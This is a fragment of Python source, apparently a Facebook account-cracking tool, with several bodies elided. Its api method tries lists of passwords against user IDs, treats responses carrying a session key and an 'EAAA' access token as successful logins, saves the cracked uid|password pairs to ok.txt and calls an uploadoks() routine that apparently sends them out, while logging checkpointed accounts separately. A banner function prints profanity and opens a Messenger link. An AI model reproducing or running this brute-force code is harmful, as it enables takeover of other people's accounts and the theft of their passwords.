...
def notice():
    ...
    runtxt('\x1b[0;92m ADMIN FACEBOOK >> X FUCK BOY ALAMGIR')
    subprocess.check_output(['am', 'start', 'https://m.me/Tera.Papa.Alamgir.441'])
...
class Main():
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write('\r\r %s\x1b[0;93m[👉][==ALAM==TERAPAPA]:\x1b[0;97m %s/%s ->\x1b[0;92m[ALAMGIR-OK:%s]-\x1b[0;93m[ALAMGIR-CP:%s]' % (B, self.loop, len(self.id), len(self.ok), len(self.cp)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                'print' '\r \x1b[0;92m[ALAMGIR-OK] %s|%s\x1b[0;97m         ' % (uid, pw)
                self.ok.append('%s|%s' % (uid, pw))
                open('ok.txt', 'a').write(' [ALAMGIR-OK] %s|%s\n' % (uid, pw))
                uploadoks()
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                'print' '\r \x1b[0;93m[ALAMGIR-CP] %s|%s\x1b[0;97m         ' % (uid, pw)
